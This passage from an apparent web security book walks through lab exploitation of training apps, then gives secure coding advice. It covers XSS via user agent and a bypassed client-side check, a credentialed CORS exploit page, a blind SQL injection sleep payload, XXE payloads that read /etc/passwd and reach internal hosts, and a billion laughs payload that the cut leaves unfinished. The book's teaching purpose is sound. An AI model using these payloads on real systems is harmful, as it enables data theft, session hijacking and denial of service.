4.  Select a result to see the requests and responses. The number of matches to your keyword search is at the bottom of the screen, to the right side of each request and response. Clicking on arrows at the bottom to the left of the search text box will take you to the keywords that have been matched.

    Looking at this HTML comment, a debug menu is available by using the get parameter debug with the true value on the myAccount page. Let us request the myAccount page with the get parameter debug=true. Manually add the parameter to the URL, and you will find two new menu options, as follows:

    ![](images/Figure_6.4.png)

    Figure 6.4: Secret Debug menu options

    These two new menu options are a way to check the logs and a way to run a ping command.

5.  Look at the logs option as shown in the following figure:

    ![](images/Figure_6.5.png)

    Figure 6.5: Amazing Myths Log files

    Here, we see that the user-agent is returned in the log files, making this an excellent place to try to inject cross-site scripting via user agent, as seen in [Chapter 5](#ch05.xhtml), Misconfiguration with Default Values.

6.  We can try a simple POC using the user agent switcher extension. Assuming we have previously set up an SQLI and XSS user agent, as seen in the following config:

    ![](images/Figure_6.6.png)

    Figure 6.6: User Agent Switcher Injections User Agent Configuration

7.  By turning on the XSS in a user-agent, then logging out, logging in, and revisiting the page, we see:

    ![](images/Figure_6.7.png)

    Figure 6.7: Cross-site scripting via user agent in hidden logs

8.  The HTML shows the script appearing several times. Refer to the following figure:

    ![](images/Figure_6.8.png)

    Figure 6.8: HTML showing cross-site scripting payloads inserted into HTML displayed logs

This could set a trap to steal cookies for session hijacking. This is left as an exercise for the reader.

[Bypassing client-side code controls](#contents.xhtml_sc3_86a)

Client-side controls and validations supply fast feedback to the user. However, this feedback offers no security because a malicious user can bypass these client-side controls.

One of the easiest methods of bypassing client-side control is using an interception proxy. In this case, we intercept a request that has gone through validation and change the values to values that would not pass that validation. Let us look at a cross-site scripting example. Security can never be guaranteed via client-side controls.

Now, let us look at the cross-site scripting example on amazing-myths-2\. Register a new account if you need one, and log in with those credentials. We will again go to the Posts and select the first post. Let us try the working example from amazing-myths-3 with a different number. So, our payload is <ScRipT>alert(2)</script>. The mixed case will not allow us to bypass the client-side control, as follows:

![](images/Figure_6.9.png)

Figure 6.9: Initial attempt at cross-site scripting

Investigating the changes to the JavaScript functionality is left as an exercise for the reader. As specified, this is a client-side control. The client-side does not supply security. Turn intercept on in the Burp Suite. Change your payload to anything that passes the client-side security control, such as the payload below, which removed the t from the script tag:

![](images/Figure_6.10.png)

Figure 6.10: Choose a payload that bypasses the client-side controls

Click, add a comment, and Burp Suite will intercept the request. Refer to the following figure:

![](images/Figure_6.11.png)

Figure 6.11: Modify request in Burp Suite back to the original, bypassing the client-side control

Modify the comment value to be the original cross-site scripting payload as follows:

![](images/Figure_6.12.png)

Figure 6.12: Modify the comment to contain the XSS payload

Note that the value is URL encoded. If you need to add special characters, you can use the decode tab to encode those. This example does not require this, but if the clientside control blocked the < and > sign, then you would need to use URL encoding on the characters before reinserting. To do this with the decoder tool, click the decoder tab. Type the text to encode in the top box. From the Encode as drop-down, select URL. The encoded text will appear in a new text box below the first. This is illustrated in the following figure:

![](images/Figure_6.13.png)

Figure 6.13: Using Decoder to URL encode characters

After changing the comment value, click the Forward button.

The page will refresh, and you will see your cross-site scripting, as follows:

![](images/Figure_6.14.png)

Figure 6.14: Client-side bypass cross-site scripting execution

[Secure coding guidance for client-side code](#contents.xhtml_sc3_87a)

As part of the SSDLC, secret scanners should be used. These scanners are designed to detect secrets and passwords. They are specialized security tools that automatically scan code repositories and configurations for sensitive information, such as API keys, passwords, and cryptographic keys. They help find and remediate potential security risks by flagging exposed secrets, reducing the likelihood of unauthorized access or data breaches.

Several tools can scan Java and JavaScript code for secrets and passwords, including:

*   TruffleHog:  TruffleHog is a Python-based tool that scans code repositories for high-entropy strings, such as passwords and API keys, including those in Java and JavaScript code.
*   GitLeaks: GitLeaks is a command-line tool that scans Git repositories for exposed secrets. It can be used to analyze both Java and JavaScript code repositories.
*   GitleaksJS: GitleaksJS is a JavaScript-based variation of GitLeaks designed to find sensitive information in JavaScript code repositories.

These tools are valuable for finding exposed secrets and passwords in both Java and JavaScript, enhancing code security and data protection. These scanners should be run as part of the release pipeline, but running them is also beneficial before the code is pushed to a repository. When secrets are committed to a source code repository, they are in the history even after they are removed. If a password or cryptography key gets committed to a repo, it should be changed immediately. So, to avoid this tedious response, the development team could use git hooks or the equivalent to run a tool and give the results to the developers before the commit. This would allow the developers to change secrets before exposure, i.e., before the code is committed. Breaking the commit process would not be a good idea if any secrets are found. Secrets scanners generally have false positives.

Secret scanners can help with this problem, but all these tools follow specific rules. Obscured secrets on the client side may pass a secrets scanner but would be available to a determined attacker.

All security checks need to occur on the server side. A client-side security check cannot be secure, as it can be easily bypassed. Use client-side checks for usability as your business desires, but perform all security checks on the server.

[Client-side storage](#contents.xhtml_sc2_88a)

Cookies are the most common client-side storage possibility, but there are others.

Client-side storage could refer to client-side JavaScript variables or the HTML5 options localStorage and sessionStorage.

In HTML5, localStorage and sessionStorage are client-side web storage mechanisms like Cookies:

*   localStorage is a persistent storage option that allows web applications to store key-value pairs on a user's device. Data stored in localStorage is still available even after the browser is closed and can be accessed across browser sessions.
*   sessionStorage, on the other hand, supplies a similar key-value storage mechanism but is session-specific. Data stored in sessionStorage is only available for the page session and is removed when the session ends, typically when the browser is closed or the tab is closed.

Unlike Cookies with the HTMLOnly flag, localStorage and sessionStorage cannot be prevented from being used in JavaScript. Thus, any time there is cross-site scripting, anything stored in localStorage or sessionStorage can be viewed by an attacker.

[LocalStorage and SessionStorage basics](#contents.xhtml_sc3_89a)

In this section, we will look at some basic JavaScript examples that show how to use localStorage and sessionStorage. The first example below shows the basic setting of a single item in localStorage:

// Set a value in localStorage

localStorage.setItem('favoriteColor', 'red');

// Get a value from localStorage

const storedColor = localStorage.getItem('favoriteColor');

console.log('favorite Color (localStorage):', storedColor);

The following example will show similar code for sessionStorage:

// Set a value in sessionStorage

sessionStorage.setItem('lunchOrder', 'Turkey Sandwich');

// Get a value from sessionStorage

const lunchOrder = sessionStorage.getItem(' lunchOrder ');

console.log(' lunchOrder (sessionStorage):', lunchOrder);

In the code above, we first set a key-value pair in either localStorage or sessionStorage using setItem. Then, we retrieve the value associated with a specific key using getItem. The values are stored as strings so that you can store and retrieve strings, numbers, or other serializable data types. Remember that values stored in localStorage persist even after the browser is closed, while sessionStorage values are only available for the duration of the browser session.

To loop through the items stored in localStorage in JavaScript, you can use a for loop along with the localStorage object's length property and the key() method. Here is an example:

// Loop through items in localStorage

for (let i = 0; i < localStorage.length; i++) {

const key = localStorage.key(i);

const value = localStorage.getItem(key);

console.log(`Key: ${key}, Value: ${value}`);

}

In the code above, we use a for loop to iterate through the items stored in localStorage. The localStorage.length property gives you the number of items stored and localStorage.key(i) retrieves the key (name) of the item at the specified index i. You can then use localStorage.getItem(key) to get the value associated with that key. SessionStorage is done similarly.

[Secrets and modifications](#contents.xhtml_sc3_90a)

When secrets or values used to make access decisions are stored in localStorage or sessionStorage, it is simple to see those values and modify them as necessary.

Let us use developer tools to look at these values in the habit-helper application. First, let us use our account to log in, checking the remember me check box.

Then go to Developer tools by selecting the menu represented by three dots, selecting more tools, and then selecting Developer tools, as follows:

![](images/Figure_6.15.png)

Figure 6.15: Start Developer tools

After developer tools open from the tabs, select Application, if necessary, clicking >> to see more tab options as follows:

![](images/Figure_6.16.png)

Figure 6.16: Change to the Application tab

Then, under the storage options, we can look at everything in localStorage and sessionStorage. The localStorage contents are as follows:

![](images/Figure_6.17.png)

Figure 6.17: Local Storage values for habit-helper

The following figure shows the contents of the sessionStorage:

![](images/Figure_6.18.png)

Figure 6.18: Session Storage for habit-helper

The localStorage has a rememberMe Boolean, the username, and a rememberMeToken. The sessionStorage has a csrfToken. Performing a session hijacking attack via stealing localStorage via cross-site scripting will be discussed in [Chapter 10](#ch10.xhtml), Session Management. The CSRF token will be discussed in-depth in [Chapter 11](#ch11.xhtml), Authorization Practices, including exploiting this example.

You can change these values by selecting them and entering a new value here in the Developer tools.

[Secure code guidelines for client-side storage](#contents.xhtml_sc3_91a)

LocalStorage and sessionStorage are accessible for the attacker to see and manipulate. There is also no protection against cross-site scripting in localStorage and sessionStorage. If it is stored there, it can be stolen via cross-site scripting. Cookies are safer for storing sensitive information than localStorage or sessionStorage.

So, these should never be used to store sensitive security information such as cryptography keys, Cross-Site Request Forgery (CSRF) tokens, or business-sensitive information (i.e., implementation details, trade secrets, etc.). Personal identifiable information (PII) should not be stored in either. The application should never use either storage mechanism to store any information to allow access to resources in the application. So, the application's user should not be determined by these storages, nor should their role. Session IDs also should not be stored in localStorage or sessionStorage.

These storages are helpful for non-security purposes only. Their values should be considered untrusted.

[Cross-Origin Resource Sharing](#contents.xhtml_sc2_92a)

CORS is a security feature implemented in web browsers that controls access to resources on a web page from different domains. It enables web servers to specify which origins are allowed to access their resources, enhancing the security of web applications by preventing unauthorized cross-origin requests.

CORS security concerns arise when misconfigurations or overly permissive policies allow unintended cross-origin access. These can lead to potential threats, such as CSRF attacks, data theft, and unauthorized access to sensitive data. It is crucial to properly configure CORS policies to restrict cross-origin requests to trusted domains and safeguard web applications from these security risks.

[Brief overview of same origin policy](#contents.xhtml_sc3_93a)

It is only possible to talk about CORS by talking about the same origin policy (SOP). The SOP is consulted when cross-site HTTP requests are initiated from within the client-side scripts such as JavaScript or when an Ajax request is run. The SOP does not apply when loading CSS stylesheets, images, and scripts. It defines an origin by the protocol, host, and port. So, HTTP or HTTPS is generally the protocol. The host is the domain name, such as Google.com. Different subdomains count as other hosts in terms of the same origin policy. The port is either specified after the host in the URL with a colon or will be the default port for the protocol (IE 80 for HTTP or 443 for HTPPS).

A resource is only loaded if the origin matches precisely, so the protocol, the host, and the port must match for a resource to be loaded following the same origin policy.

Let us look at this example using brackish.io from [Chapter 2](#ch02.xhtml), Reconnaissance and Mapping.

So, [https://brackish.io/](https://brackish.io/) and [https://brackish.io/blog/](https://brackish.io/blog/) both use the same protocol --https. They have the same host – brackish.io, and use the same port – 443, the default HTTPS port. Thus, they have the same origin per the SOP.

Differently, [https://brackish.io/blog/](https://brackish.io/blog/) and [https://shop.brackish.io/](https://shop.brackish.io/) do not have the same origin per the SOP. They both have the same protocol – HTTPS. They also have the same port – the default HTTPS port 443\. They do not have the same host, as shop.brackish.io is not considered the same as brackish.io via the SOP.

Some older browsers did not always interpret the same origin policy in the same way, and this caused interesting vulnerabilities. Keep this in mind if you find applications requiring older browsers to run.

[Client-side Cross-Origin Request Basics](#contents.xhtml_sc3_94a)

If the SOP is too restrictive, then we use CORS. CORS allows you to turn off the security provided by SOP. The complete specification is available at the following URL for more details: [https://www.w3.org/TR/cors/](https://www.w3.org/TR/cors/).

CORS has its own HTTP headers that are not part of the HTTP standard and vary depending on the CORS request type.

The simple CORS request is called the simple request. It must use the HTTP verbs: get, head, or post. The only allowed values for the content-type header are application/x-www-form-urlencoded, multi-part/form-data, or text/plain. The JavaScript for sending a simple CORS is given below with an empty handler function:

var crossoriginget = new XMLHttpRequest();

//The target site

var url = 'https://myURL’;

function handler() {

…

}

crossoriginget.open('GET', url, true);

crossoriginget.onreadystatechange = handler;

// This is the HTTP VERB GET SEND

crossoriginget.send();

When simple requests are not enough, a pre-flight request is sent, which will use the options method and decide whether the actual request is safe to send. The options method is helpful as it tells us what we can send and cannot.

Some requests are sent with credentials. The XMLHTTPRequest.withcredentials property is a Boolean that shows whether or not cross-site-access-control-request should be made using credentials such as cookies, authorization headers, or TLS Client certificates. Setting with credentials does not affect the same site request.

When talking about CORS requests, an arbitrary reflected origin is when the access- control-allow-origin header returns a specific origin, making it look like the match was an allowlist, but it will accept any origin. i.e., the same as the * value.

Now, let us look at a few pre-flight control headers. The first interesting header is the access-control-max-age header. This shows how long the results of a preflight request can be cached.

If CORS requests allow credentials, then the origins must be on an allowlist to be secure. Thus, allowing * or using an arbitrary reflected origin with credentials indicates a security flaw. Sometimes, credentials are not needed with CORS requests to find a security flaw caused by arbitrary origin. If the CORS request is locked down and not generally available, then it could be a security issue. The following subsection goes through how to test for such a flaw manually.

[Exploitation](#contents.xhtml_sc3_95a)

Manual exploitation is needed to find a CORS issue. Burp Suite professional Dynamic Application Security Testing (DAST) scanner and other DAST scanners sometimes indicate a CORS issue, but it needs to be manually tested to confirm. The basic steps involved in testing for CORS are:

1.  Identify potential CORS issue URLs.
2.  Set up POC to test that basic CORS request with no additional headers.
3.  Try POC with a null origin and an actual origin
4.  If it did not work, check to see if there is any client-side information that could be used to make it work. IE is a header value that is provided in client-side JavaScript. If so, add the header and try again.
5.  The attack is successful if the request should not be public due to its sensitive nature or if the request returns session cookies or auth headers.

There are several versions of this POC on the internet. A basic version, which has several options in the comments, is as follows:

<html>

<head>

<title>CORS POC</title>

</head>

<body>

<h1>CORS POC</h>

<div id="hacktheplanet">

<button type="button" onclick="exploitcors()"> Exploit Cors </button>

<p>Latest Response:

<p>

</div>

<script>

function exploitcors() {

var crossoriginget = new XMLHttpRequest();

//The target site with the bad CORS configuration

var url = 'https://urlToTest';

crossoriginget.onreadystatechange = function() {

if ((this.readyState == 4) && (this.status == 200)) {

document.getElementById("hacktheplanet").innerHTML = document.getElementById("hacktheplanet").innerHTML + this.responseText;

}

};

crossoriginget.open('GET', url, true);

//If the command is POST, use the following instead

// OR change the HTTP verb to match the example PUT or DELETE, etc

//crossoriginget.open('POST', url, true);

/* This tells the browser to send the request with cookies;

requires “Access-Control-Allow-Credentials = true” in

response headers for this.responseText to be readable. */

crossoriginget.withCredentials = true;

//Do you need more headers to set them like that?

//crossoriginget.setRequestHeader("HeaderName", "HeaderVal");

//This is how to create a body if it is a post, etc

//var body = JSON.stringify({"Data":{"Name":"Val","Date":"2023-08-05"}});

// This is the send with a body such as POST

//crossoriginget.send(body);

// This is the SEND without a body such as GET

crossoriginget.send();

}

</script>

</body>

</html>

After setting the HTML to match your URL, your request type, and any request body or headers that may be needed, you need to run it in two ways. The null origin way is easiest and involves opening the HTML from your machine when not hosted on a domain. The origin will be null, and you will check an interesting edge case.

The other way to test this is to spin up a web server on Amazon Web Services (AWS) or a similar cloud service and deploy the POC there. Then, you will be running with an actual origin.

When running the CORS POC, keep the developer tools open to the network. When the CORS POC is successful the HTML in the page will be updated. If the request is not vulnerable, you may see the CORs request is blocked in the console, as shown below:

![](images/Figure_6.19.png)

Figure 6.19: CORS request blocked by policy

Another indicator that the POC did not work is when the HTTP response error message shows strict-origin-when-cross, as seen in the following example:

![](images/Figure_6.20.png)

Figure 6.20: CORS failure strict origin when cross-origin

[Secure coding guidelines](#contents.xhtml_sc3_96a)

When implementing CORS in your web applications, security considerations are paramount. This subsection offers essential guidance to ensure the secure usage of CORS headers.

Disable CORS headers if cross-domain calls are not supported. Always be as specific as possible and as general as necessary when setting the origins of cross-domain calls. Do not allow arbitrary reflected origins.

The headers with major security implications are:

*   access-control-request-headers
*   access-control-allow-credentials
*   access-control-allow-origin

Always consider the implications of how these are used and what you allow access to.

Be aware that some 3rd party libraries you use may have CORS configured to allow arbitrary reflected origins by default. There is no definitive list or way to check for this common vulnerability except penetration testing. There were a few lists at one time, but they need to be updated.

Incorporating these secure coding guidelines for CORS is not merely a best practice; it is an essential step in safeguarding your web applications against potential threats. By being diligent in your CORS header configurations and mindful of their implications, you can create a robust security posture while enabling cross-origin functionality responsibly and securely.

[Conclusion](#contents.xhtml_sc2_97a)

The client-side code is a powerful ally and a potential Achilles' heel in web development. This chapter has been your compass in navigating the complex terrain of client-side code security. You have gained insights into uncovering hidden secrets, bypassing security controls, and grasping the nuanced implications of HTML5 client-side storage options like localStorage and sessionStorage. Most notably, we have covered CORS and its exploitation, equipping you with the knowledge to discern when it becomes a vulnerability and how to guard against it. As you move forward as a developer or security professional, remember that securing client-side code is a continuous battle. With the guidance and practices outlined in this chapter, you are better prepared to withstand the challenges of an ever-evolving digital environment. Understanding and managing client-side code security is crucial to ensure the safety of your web applications against potential exploits and vulnerabilities.

In the next chapter, we will explore denial-of-service (DoS) attacks, including XML External Entity Injection (XXE), file uploads, filling log files, and wildcard searches.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 7Exploring Vectors with DoS Attacks](#contents.xhtml_ch07a)

[Introduction](#contents.xhtml_sc2_98a)

In cyber security, the term denial-of-service (DoS) carries a sense of dread. It stands for the art of disruption, where the attackers aim to make digital systems helpless, often with catastrophic consequences. In this chapter, we will explore the DoS attack vectors, unraveling the mechanisms behind these nefarious attempts to cripple systems. We will understand the art of exploiting vulnerabilities related to file updates and uploads, the strategy of filling log files, the deceptive tactics of long queries and wildcard searches, and XML External Entity Injection (XXE). You will discover the techniques to find these vulnerabilities and gain invaluable insights into securing your systems against these threats. You will be equipped with the knowledge and tools to safeguard your digital assets against the looming specter of DoS attacks.

[Structure](#contents.xhtml_sc2_99a)

This chapter will discuss DoS attack vectors, including:

*   File updates and uploads
*   Filling log files or databases
*   Long queries and wildcard searches
*   XXE

Specific techniques to discover these vulnerabilities, as well as remediation advice, will also be discussed.

[Objectives](#contents.xhtml_sc2_100a)

By the end of this chapter, you will be familiar with DoS attack vectors, including the nuances of unintentional DoS scenarios where seemingly innocuous tests can unexpectedly crash the system due to underlying code bugs. You will learn when to test for DoS and the safest methods to perform those tests. Delving deeper, we will explore various attack vectors such as excessive input processing, concurrency issues, wild card searches, resource exhaustion, and memory consumption. We will also discuss safeguards to protect the environment against these attacks. Furthermore, we will learn about XXE attacks, a form of DoS, uncovering three attack methods and providing efficient strategies to fix insecure code susceptible to XXE vulnerabilities.

| A word of caution: DoS attacks are generally completely out of scope. Any testing likely to cause a DoS on any system, whether production or test, should not be done without explicit written permission. Unless it is written in the contract, never perform a test that you think is likely to crash a system or cause a denial of service. Some tests here can prove a DoS without causing one, and some information here is for accidental or unintentional DoS. Some of the information in this chapter can help you test your application to ensure the code works as expected. This chapter will also discuss some tests that do not prove DoS. |

[File updates and uploads](#contents.xhtml_sc2_101a)

DoS attacks stemming from file uploads significantly threaten web application security. In these scenarios, attackers exploit the file upload functionality vulnerabilities, overwhelming the server's resources and causing service disruptions. Through tactics such as uploading large or many files simultaneously, attackers aim to exhaust server resources, leading to performance degradation and potentially making the system unresponsive. Additionally, malicious actors may exploit inadequate validation and processing of file uploads, injecting specially crafted files that trigger resource-intensive operations upon processing, amplifying the impact of the DoS attack. Testing file upload attacks will be covered in [Chapter 8](#ch08.xhtml), Executing Business Logic Vulnerabilities.

If there is a file upload functionality and DoS is out of scope, then ask in the scoping for any limits on these uploads. These limits let you know what to test for. For example, if you know that the application will not accept files larger than 500 KB, and you can upload one greater than most likely, their controls are not working, and a DoS is possible. Even if a DoS is impossible, this would be a business logic vulnerability. If the application should only allow six file uploads per user transaction, then if you can upload seven, you have proof that DoS is likely.

If you did not ask if there are limits, then the only way to prove an issue would be to cause a DoS. If you can upload 1000 files without any issues, then there is no reason to assume 1001 would cause any problem, although it might. For file uploads, test any limits you were given or stated on the website, including the HTML and JavaScript. For example, can you bypass a client-side control that checks for file size? If so, that is a vulnerability with a high probability of causing a DoS issue.

If you have permission to test for a file upload DoS, there are two primary attacks. The first is to upload a slightly different file many times, which can be done using Burp Intruder. The second is uploading increasingly large files to get an error.

We will walk through an example of using Intruder to upload slightly different files to test for DoS. Remember, this should only be done with specific permission during a penetration test and may be annoying to fix if you crash an instance running on your local hard drive. For this example, we will only upload ten different files.

We will use amazing-myths-3 for this walkthrough. Follow the given steps:

1.  Login using a previously made account or register a new one, and log in now. Select Add new post from the menu as shown below:

    ![](images/Figure_7.1.png)

    Figure 7.1: Add new post menu option

2.  From here, the page will allow you to select an image to upload. First, ensure that the Burp Interception proxy is on by going to the Proxy tab and checking if the Intercept is off. If so, click where it says Intercept is off to toggle the interception. Refer to the following figure:

    ![](images/Figure_7.2.png)

    Figure 7.2: Turn intercept on

3.  Select a valid image to upload and click the Upload button as follows:

    ![](images/Figure_7.3.png)

    Figure 7.3: Upload an image

    This will intercept the request in the Burp Proxy.

4.  From the proxy, right-click and select send to the intruder, as follows:

    ![](images/Figure_7.4.png)

    Figure 7.4: Intercept image upload

5.  Select the Intruder tab. You will see something similar to the following example:

    ![](images/Figure_7.5.jpg)

    Figure 7.5: Intruder Positions tab

6.  From the right menu, select the Clear button. Then, add the numeral one after the filename and before the extension. Highlight the number 1 only and click the Add button, as follows:

    ![](images/Figure_7.6.jpg)

    Figure 7.6: Filename enumeration

7.  Next, select the Payloads tab, and for a payload type, select numbers as follows:

    ![](images/Figure_7.7.png)

    Figure 7.7: Payload type numbers

8.  Select sequential for the type. Set the From  field to have a value of 1 and the To field to have a value of 10. For the Step, set the value to 1\. This says to go through numbers sequentially from 1 to 10, counting by ones. This is shown in the following figure:

    ![](images/Figure_7.8.png)

    Figure 7.8: Payload values

    Start the attack by clicking the Start attack button on the upper right screen.

9.  The results show up in their window. We can look at the request and response for each outcome. The results all returned a 200 OK, and the lengths are very close except for request 1. Further investigation shows all the requests except 1 have a File Uploaded successfully message as follows:

    ![](images/Figure_7.9.png)

    Figure 7.9: File upload successful from Burp Intruder

10.  On the other hand, request one has an exception because the file already exists, as shown in the following figure:

    ![](images/Figure_7.10.png)

    Figure 7.10: Identifying a File Exists Exception from Burp Suite Intruder

This result has information in it, although none of it is related to DoS. First, we learned the java.nio.file class is being used, and the web server is apache-tomcat-8.5.68. We also are given an exact path for image locations, which may be helpful in later testing.

This test uploaded nine images; if we had a limitation of 8 or fewer, this would violate that limitation and would be a business logic vulnerability with a high probability of DoS capabilities.

[Secure code guidance for file upload or update DoS](#contents.xhtml_sc3_102a)

Implementing robust input validation, size limitations, and efficient resource management in the file upload process is crucial to mitigate the risks associated with this form of DoS. Consistently implement a size limit on file uploads or updates. Choosing a limit can be challenging; if you already have many data files, look at the average size uploaded and the standard deviation. Look for outliers, but choosing the average size plus two or three standard deviations as your limit should be sufficient. Your application should also have a limit on the number of files uploaded per user per time limit. Depending on the business use case, the number changes, but it may be six files for a claim for an insurance company or one file per post per comment on a blog. The exact limitation is not as important as the existence of a restriction.

[Filling log files or databases](#contents.xhtml_sc2_103a)

Through the deliberate filling of log files or databases, DoS attacks pose a severe threat to the availability and functionality of web applications. In this attack, adversaries exploit vulnerabilities in logging or database systems to inundate them with excessive data, overwhelming their capacity and causing service disruptions. By flooding log files with an abundance of spurious entries or injecting a high volume of fictitious data into databases, attackers can exhaust storage resources and degrade system performance. This can result in the impairment of critical services, making the application inaccessible to legitimate users. This vulnerability is almost always found accidentally by causing a system outage unless there is a DoS event. During a penetration test, there is no way to prove that it occurs.

If it looks like you can enter an infinite number of log entries or endless database entries, it does not mean it is so. If this is a white box test, you may not see limitations in the source code, but there could be limitations in the database settings or log settings. For example, rolling logs may be set up outside of the application. Rolling logs have their security risks, but one of those is not DoS. Databases may be set to grow if they run out of space automatically or clear older data. Databases can also be set to send alerts as they get close to the database limitations. Not seeing a limit is not proof of a DoS. In these cases, only accidentally causing an issue will prove DoS.

Effective mitigation strategies involve implementing log file size limitations, input validation, and database quota controls to thwart such attacks and preserve the integrity and availability of web services.

[Long queries and wildcard searches](#contents.xhtml_sc2_104a)

DoS attacks using wildcard searches and long queries are a formidable threat vector, exploiting database and search engine system vulnerabilities. In this type of attack, adversaries submit queries with wildcards or exceptionally lengthy input, aiming to exhaust system resources and disrupt normal operations. Wildcard searches, when unchecked, can lead to extensive database scans, severely impacting performance and response times. Similarly, long queries can monopolize system resources, causing delays and unresponsive services.

[Injection and wild card or long query](#contents.xhtml_sc3_105a)

Wild card and long query issues are often found because they are assumed to be blind injection attacks. Here are some ways to distinguish between a blind injection attack and a wild card or long query:

*   A red flag is if the URL and parameter are vulnerable to multiple injection types. It is not likely to see OS command injection, SQL injection, and Python injection on the same Java application, and especially not on the same parameter.
*   If we think there is a blind injection, we witness a long process time on the request and generally use a sleep function in the query. If we significantly increase or decrease the sleep function input, we should see a change in the time to process the query. If the time does not change (on average, given a statistically significant number of events) based on the sleep function input, it is unlikely to be a blind injection.
*   If it is a wildcard search, adding more wild cards should increase the time. So, if the wild card is the *, all queries with one * should be similar, and all queries with two * should be similar and significantly more than one *.

Now, let us look at how to test this. Let us assume the blind injection payload is time-based like: ,(select * from (select(sleep(10)))a). Then, we can run this request using a burp intruder or repeater 20 to 100 times and then run it the same number of times with a different sleep parameter. For example, we might choose 1000, which should be significantly slower. On average, if the two tests have the same amount of time per response, then this is unlikely to be a good payload for a blind SQL injection here. Here are two sample requests illustrating this technique. The first request uses a sleep input parameter of 80 and has a time of 30,387 milliseconds. Refer to the following figure:

![](images/Figure_7.11.png)

Figure 7.11: Testing a possible Blind SQL injection or wildcard

The second example uses a sleep value of 1000 and takes 31,399 milliseconds. Refer to the following figure:

![](images/Figure_7.12.png)

Figure 7.12: Testing for blind SQL injection versus wildcard

Given the similarity in the times, it seems unlikely that it is a blind injection.

If blind SQL injection does not seem likely, try sending a similar payload with an extra *. For example, you might try payload: *,(select * from (select(sleep(10)))a). Then, send this request through the intruder tool 20-100 times. Next, check the time that the different requests take and determine if the time changes significantly. If it is a wildcard, having two wildcards should take more computation time than one wildcard.

For the previous example, which already has three * in the payload, try a payload with only one * and look for a significantly lower time. In the example below, we use a payload with one * and get a return time of 1920 milliseconds:

![](images/Figure_7.13.png)

Figure 7.13: Testing for wildcard search

The result demonstrates that this is a wildcard search, and using enough * in a query could significantly impact the service. Further testing could try two and three *’s in a payload without the blind SQL injection.

[Secure coding advice for wild card and long searches](#contents.xhtml_sc3_106a)

Mitigating these risks involves implementing query length restrictions, employing efficient indexing strategies, and employing rate-limiting mechanisms to prevent abuse. Some possible remediations include:

*   Do not allow this to be on the external internet.
*   Disable the wildcard ability in the search.
*   Throttle the requests to allow only so many requests per IP address per second/minute/hour/day. This would not stop a coordinated attack.

By fortifying systems against these forms of exploitation, organizations can bolster their resilience against denial-of-service attempts and preserve the reliability of their web applications.

[XXE](#contents.xhtml_sc2_107a)

Extensible Markup Language (XML) entity expansion is a process in which entities defined by external resources or within the document are replaced with their corresponding values during XML parsing. While helping modularity and code reuse, this expansion can pose security risks when uncontrolled, leading to entity expansion attacks such as XML External Entity (XXE) injection. This is a specific type of XML injection. The basics of XML injection were discussed in [Chapter 4](#ch04.xhtml), Observability with SQL Injections.

XXE injection is when an external entity, often represented by a URL pointing to a local file, web service, or a local variable within the XML document, can be exploited during parsing. Notably, many XML parsers, especially those in the Java environment, have XXE enabled by default, making them susceptible to attacks. However, the concern extends beyond Java, as documented issues with XXE vulnerabilities exist in parsers for C/C++, .NET, PHP, and iOS, underscoring the pervasive nature of this security risk across various programming languages and platforms.

The impact of XXE vulnerabilities can be severe, enabling attackers to exploit unwittingly permissive XML parsers and gain unauthorized access to sensitive files or resources. By injecting crafted XML documents, attackers can potentially access confidential files like /etc/password or exploit back-end web services, leading to unauthorized disclosure of sensitive information. Additionally, exploiting XXE vulnerabilities can result in DoS situations, where attackers deliberately craft XML documents to consume all available memory during parsing, causing system crashes and rendering services unavailable. Compounding the issue is the need for more awareness among developers about XML documents supporting external entities, coupled with the common practice of accepting XML documents from untrusted sources and processing them with XML parsers that have XXE enabled by default.

[Exploitation](#contents.xhtml_sc3_108a)

Testing for XXE involves injecting variations of such payloads into XML input fields and seeing the application's response. Suppose the application processes the external entity and displays the contents of sensitive files or network resources. In that case, it shows an XXE vulnerability that needs to be addressed to prevent potential information disclosure or unauthorized access.

One straightforward example on a Linux server to read the /etc/passwd file is the following:

<!DOCTYPE foo [

<!ELEMENT foo ANY >

<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<foo>&xxe;</foo>

In this example, an external entity named xxe is defined, and its value is set to the content of the /etc/passwd file. The entity is then referenced within the XML document.

If an application parses this XML document without proper protection against XXE, it might inadvertently process the external entity and fetch the contents of /etc/passwd. This can lead to the exposure of sensitive system information.

The C:\Windows\System32\drivers\etc\hosts file is a good alternative for a basic test on a Windows machine. After confirming the XXE, various other files can be read to gain information for your attack.

Another simple example is reading a local network resource. For example, consider the public webserver hostA in a network zone with hostB, but hostB is unavailable on the public internet. Then, if hostA had a XXE vulnerability, we could reach hostB web service, etc., from the XXE on hostA. The following XML would read the base hostB website:

<!DOCTYPE foo [

<!ELEMENT foo ANY >

<!ENTITY xxe SYSTEM "https://hostB/" >]>

<foo>&xxe;</foo>

This code is almost identical to the earlier one, substituting a local URL for a file.

The most dangerous example of XXE is a DoS attack, like the billion laughs attack discussed in the following subsection.

[Billion laughs attack](#contents.xhtml_sc3_109a)

The billion laughs attack is a specific XXE injection known since the early 2000s. It gained attention as a demonstration of the potential risks associated with XXE vulnerabilities in XML parsers.

The attack relies on the recursive expansion of entities within an XML document, causing an exponential increase in the size of the document during parsing. This leads to a substantial consumption of system resources, resulting in a denial-of-service condition.

While the attack is not new, it has been a prominent example in discussions about secure coding practices and protecting against XXE vulnerabilities. Over the years, awareness of XXE and related attacks has grown, prompting developers and organizations to implement measures to mitigate these risks in XML parsing processes.

This attack is characterized by its amplifying effect, as a small, seemingly harmless XML document can trigger an enormous number of entity expansions, crippling the parsing process and potentially causing significant disruption. An example that requires only 14 lines of XML is as follows:

<!DOCTYPE lolz [

<!ENTITY lol "lol">

<!ELEMENT lolz (#PCDATA)>

<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">

<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">

<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">

<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">

<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">

